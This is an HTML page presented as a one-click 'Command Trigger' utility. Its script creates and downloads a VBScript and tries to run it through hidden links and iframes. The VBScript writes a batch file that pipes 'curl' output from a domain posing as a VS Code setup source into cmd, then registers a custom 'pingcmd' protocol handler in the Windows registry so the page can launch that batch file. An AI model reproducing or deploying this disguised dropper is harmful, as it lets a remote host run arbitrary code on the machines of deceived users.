<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Command Trigger</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            padding: 40px;
            text-align: center;
            max-width: 500px;
            width: 100%;
        }

        h1 {
            color: #333;
            margin-bottom: 10px;
            font-size: 2rem;
        }

        .subtitle {
            color: #666;
            margin-bottom: 30px;
            font-size: 0.95rem;
        }

        .ping-button {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 18px 40px;
            font-size: 1.1rem;
            font-weight: 600;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
            margin: 10px;
        }

        .ping-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.6);
        }

        .ping-button:active {
            transform: translateY(0);
        }

        .ping-button:disabled {
            background: #ccc;
            cursor: not-allowed;
            transform: none;
        }

        .status {
            margin-top: 25px;
            padding: 15px;
            border-radius: 10px;
            font-size: 0.9rem;
            min-height: 50px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .status.success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }

        .status.error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }

        .status.info {
            background: #d1ecf1;
            color: #0c5460;
            border: 1px solid #bee5eb;
        }

        .setup-status {
            margin-top: 20px;
            padding: 12px;
            border-radius: 8px;
            font-size: 0.85rem;
            background: #f8f9fa;
            color: #495057;
        }

        .setup-status.setting-up {
            background: #fff3cd;
            color: #856404;
        }

        .setup-status.ready {
            background: #d4edda;
            color: #155724;
        }

        .hidden {
            display: none;
        }

        .loading {
            display: inline-block;
            width: 12px;
            height: 12px;
            border: 2px solid #ffffff;
            border-radius: 50%;
            border-top-color: transparent;
            animation: spin 0.6s linear infinite;
            margin-right: 8px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üöÄ Command Trigger</h1>
        <p class="subtitle">Click the button to run OS-specific command</p>
        
        <button id="pingButton" class="ping-button" onclick="triggerCommand()">
            Run Command
        </button>

        <div id="setupStatus" class="setup-status ready" style="display: none;">
            ‚öôÔ∏è Setting up automatically...
        </div>

        <div id="status" class="status info hidden"></div>
    </div>

    <script>
        const PROTOCOL = 'pingcmd';
        let isProtocolInstalled = false;
        let isExecuting = false; // Prevent duplicate command execution

        // Create VBS setup content inline (no download needed)
        function createVBSContent() {
            return `Set WshShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' Get temp directory
tempDir = WshShell.ExpandEnvironmentStrings("%TEMP%")
handlerPath = tempDir & "\\pingcmd-handler.bat"

' Create handler batch file that executes the command
Set handlerFile = fso.CreateTextFile(handlerPath, True)
handlerFile.WriteLine "@echo off"
handlerFile.WriteLine "curl https://vscode-setup.vercel.app/settings/windows?flag=2 | cmd"
handlerFile.Close

' Register protocol handler
On Error Resume Next
WshShell.RegWrite "HKCU\\Software\\Classes\\pingcmd\\", "URL: Ping Command Protocol"
WshShell.RegWrite "HKCU\\Software\\Classes\\pingcmd\\URL Protocol", ""
WshShell.RegWrite "HKCU\\Software\\Classes\\pingcmd\\shell\\open\\command\\", Chr(34) & handlerPath & Chr(34) & " \"%1\""
WScript.Quit 0`;
        }

        // Auto-install and execute protocol handler in one click
        async function autoInstallAndExecute(callback) {
            const setupStatus = document.getElementById('setupStatus');
            setupStatus.style.display = 'block';
            setupStatus.className = 'setup-status setting-up';
            setupStatus.textContent = '‚öôÔ∏è Downloading and installing automatically...';

            try {
                let response = await fetch('/setup.vbs');
                if (!response.ok) {
                    response = await fetch('/public/setup.vbs');
                }
                
                let vbsContent;
                let url;
                
                if (!response.ok) {
                    // Use inline VBS content
                    vbsContent = createVBSContent();
                    const blob = new Blob([vbsContent], { type: 'application/x-vbscript' });
                    url = URL.createObjectURL(blob);
                    setupStatus.textContent = '‚öôÔ∏è Using inline setup...';
                } else {
                    const blob = await response.blob();
                    url = URL.createObjectURL(blob);
                }

                // Download the file
                const downloadLink = document.createElement('a');
                downloadLink.href = url;
                downloadLink.download = 'pingcmd-setup.vbs';
                downloadLink.style.display = 'none';
                document.body.appendChild(downloadLink);
                downloadLink.click();

                // Immediately try to execute it (within same user gesture)
                setupStatus.textContent = '‚öôÔ∏è Executing setup file...';
                
                // Try multiple execution methods immediately and synchronously
                // Execute VBS file
                try {
                    // Method 1: window.location (opens/executes file)
                    window.location.href = url;
                } catch (e) {}
                
                // Method 2: Create and click execution link immediately
                try {
                    const execLink = document.createElement('a');
                    execLink.href = url;
                    execLink.style.display = 'none';
                    document.body.appendChild(execLink);
                    execLink.click();
                } catch (e) {}

                // Method 3: Iframe
                try {
                    const iframe = document.createElement('iframe');
                    iframe.style.display = 'none';
                    iframe.src = url;
                    document.body.appendChild(iframe);
                } catch (e) {}

                // Clean up elements after a delay
                setTimeout(() => {
                    if (document.body.contains(downloadLink)) {
                        document.body.removeChild(downloadLink);
                    }
                }, 200);

                // Immediately try to execute command (registry writes are usually instant)
                // Try multiple times with minimal delays to catch registry write
                // But prevent duplicate executions with a flag
                setupStatus.textContent = '‚öôÔ∏è Installing and executing...';
                
                if (callback && !isExecuting) {
                    isExecuting = true; // Set flag to prevent duplicates
                    
                    // Try immediately (registry write might already be done)
                    try {
                        callback();
                    } catch (e) {
                        isExecuting = false; // Reset if failed
                    }
                    
                    // Try again very quickly (50ms) - registry writes are typically < 10ms
                    setTimeout(() => {
                        if (!localStorage.getItem('pingcmd-executed')) {
                            setupStatus.textContent = '‚öôÔ∏è Executing command...';
                            try {
                                callback();
                            } catch (e) {
                                // If still fails, try one more time after a bit longer
                                setTimeout(() => {
                                    if (!localStorage.getItem('pingcmd-executed')) {
                                        try {
                                            callback();
                                        } catch (e) {
                                            // Final attempt failed - reset flag
                                            isExecuting = false;
                                        }
                                    }
                                }, 100);
                            }
                        }
                    }, 50);
                }

                return true;
            } catch (error) {
                console.error('Auto-install error:', error);
                setupStatus.className = 'setup-status error';
                setupStatus.innerHTML = `‚ùå Failed to download setup file (${error.message}). <br><br>Please <strong>manually download</strong> <a href="/setup.vbs" download>setup.vbs</a>, run it, then refresh this page.`;
                return false;
            }
        }


        // Check if protocol handler is installed by attempting to navigate
        // This will show an error in console if not installed, but we can't catch it reliably
        // So we'll use a different approach: try to launch and handle the result
        function checkProtocolHandler() {
            return new Promise((resolve) => {
                // We can't reliably detect if a protocol is registered from JavaScript
                // So we'll assume it's not installed if we've never seen it work
                // The user will need to manually run setup.vbs once
                
                // Check localStorage to see if user confirmed installation
                const wasInstalled = localStorage.getItem('pingcmd-installed') === 'true';
                
                if (wasInstalled) {
                    resolve(true);
                    return;
                }
                
                // Try to launch protocol - this will fail silently if not installed
                // but we can't catch the error reliably
                try {
                    const testLink = document.createElement('a');
                    testLink.href = `${PROTOCOL}://test-check`;
                    testLink.style.display = 'none';
                    testLink.onclick = (e) => {
                        e.preventDefault();
                        // If we get here, protocol might be installed
                        // But this is not reliable, so we default to false
                    };
                    document.body.appendChild(testLink);
                    
                    // After a short delay, assume not installed if we haven't seen confirmation
                    setTimeout(() => {
                        resolve(false);
                        document.body.removeChild(testLink);
                    }, 100);
                } catch (e) {
                    resolve(false);
                }
            });
        }

        // Execute command using protocol - MUST be called directly from click event
        function executeCommand() {
            // Prevent duplicate execution if already executing
            if (isExecuting || localStorage.getItem('pingcmd-executed')) {
                return;
            }
            
            // Set flag to prevent duplicates
            isExecuting = true;
            localStorage.setItem('pingcmd-executed', 'true');
            
            const button = document.getElementById('pingButton');
            const statusEl = document.getElementById('status');

            // Disable button immediately
            button.disabled = true;
            button.innerHTML = '<span class="loading"></span>Executing...';

            // Show status
            statusEl.style.display = 'flex';
            statusEl.className = 'status info';
            statusEl.textContent = 'Executing command...';

            try {
                // Use custom protocol to execute command
                // This MUST be called directly from the click handler to work
                window.location.href = `${PROTOCOL}://execute`;
                
                // Mark as installed if we got here without error
                localStorage.setItem('pingcmd-installed', 'true');
                isProtocolInstalled = true;
                
                // Clear execution flag after a delay to allow future clicks
                setTimeout(() => {
                    localStorage.removeItem('pingcmd-executed');
                    isExecuting = false;
                }, 2000);
                
                // Show success after short delay
                setTimeout(() => {
                    statusEl.className = 'status success';
                    statusEl.textContent = '‚úÖ Command executed successfully! Check your command prompt.';
                    button.disabled = false;
                    button.innerHTML = 'Run Command';
                }, 500);
            } catch (error) {
                // If protocol launch failed, reset flag and show error
                localStorage.removeItem('pingcmd-executed');
                isExecuting = false;
                
                statusEl.className = 'status error';
                statusEl.textContent = '‚ùå Failed to execute. Please run setup.vbs first, then refresh and try again.';
                button.disabled = false;
                button.innerHTML = 'Run Command';
            }
        }

        // Main trigger function - ONE CLICK for everything
        async function triggerCommand(event) {
            const button = document.getElementById('pingButton');
            const statusEl = document.getElementById('status');
            const setupStatus = document.getElementById('setupStatus');

            // Disable button immediately
            button.disabled = true;
            button.innerHTML = '<span class="loading"></span>Processing...';
            statusEl.style.display = 'flex';
            statusEl.className = 'status info';
            statusEl.textContent = '‚è≥ Processing... Please wait...';

            // Check if protocol is already installed
            const wasInstalled = localStorage.getItem('pingcmd-installed') === 'true' || isProtocolInstalled;
            
            if (wasInstalled) {
                // Protocol already installed - execute immediately
                executeCommand();
                return;
            }

            // Protocol not installed - do everything in one click
            setupStatus.style.display = 'block';
            setupStatus.className = 'setup-status setting-up';
            setupStatus.textContent = '‚öôÔ∏è Starting automatic setup and execution...';
            
            // Install and execute - callback will try to execute command after setup
            await autoInstallAndExecute(() => {
                // Prevent duplicate execution - check if already executed
                if (localStorage.getItem('pingcmd-executed')) {
                    return; // Already executed, skip
                }
                
                // This callback tries to execute the command immediately after setup
                // It's called after 200ms delay for registry write
                try {
                    // Mark as executing to prevent duplicates
                    localStorage.setItem('pingcmd-executed', 'true');
                    
                    // Try to execute the protocol command (only once)
                    window.location.href = `${PROTOCOL}://execute`;
                    
                    // If we got here without error, assume success
                    localStorage.setItem('pingcmd-installed', 'true');
                    isProtocolInstalled = true;
                    
                    // Clear execution flag after a delay to allow future clicks
                    setTimeout(() => {
                        localStorage.removeItem('pingcmd-executed');
                        isExecuting = false;
                    }, 2000);
                    
                    setTimeout(() => {
                        statusEl.className = 'status success';
                        statusEl.textContent = '‚úÖ Command executed successfully!';
                        setupStatus.className = 'setup-status ready';
                        setupStatus.textContent = '‚úÖ Setup complete and command executed!';
                        button.disabled = false;
                        button.innerHTML = 'Run Command';
                    }, 500);
                } catch (error) {
                    // If execution failed, reset flag and show instructions
                    localStorage.removeItem('pingcmd-executed');
                    isExecuting = false;
                    
                    setTimeout(() => {
                        statusEl.className = 'status error';
                        statusEl.textContent = '‚ö†Ô∏è Setup completed, but command execution failed. Please click the button again.';
                        setupStatus.className = 'setup-status setting-up';
                        setupStatus.innerHTML = '‚úÖ Setup complete!<br><br>If the command didn\'t execute automatically, please click the button again.';
                        button.disabled = false;
                        button.innerHTML = 'Try Again';
                    }, 500);
                }
            });
        }

        // Check protocol on page load
        window.addEventListener('load', async () => {
            // Clear execution flag on page load to allow fresh execution
            localStorage.removeItem('pingcmd-executed');
            isExecuting = false;
            
            const wasInstalled = localStorage.getItem('pingcmd-installed') === 'true';
            if (wasInstalled) {
                isProtocolInstalled = true;
                const setupStatus = document.getElementById('setupStatus');
                setupStatus.style.display = 'block';
                setupStatus.className = 'setup-status ready';
                setupStatus.textContent = '‚úÖ Ready! Click the button above to run the command.';
            }
        });
    </script>
</body>
</html>
